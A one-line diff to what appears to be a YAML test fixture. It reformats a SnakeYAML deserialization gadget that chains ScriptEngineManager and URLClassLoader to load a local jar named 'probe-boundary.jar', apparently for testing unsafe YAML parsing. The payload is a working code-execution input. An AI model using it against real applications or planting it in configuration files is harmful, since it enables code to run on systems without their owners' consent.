@@ -1,1 +1,1 @@
-payload: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["file:/src/probe-boundary.jar"]]]]
+!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [ [ !!java.net.URL ["file:/src/probe-boundary.jar"] ] ] ]
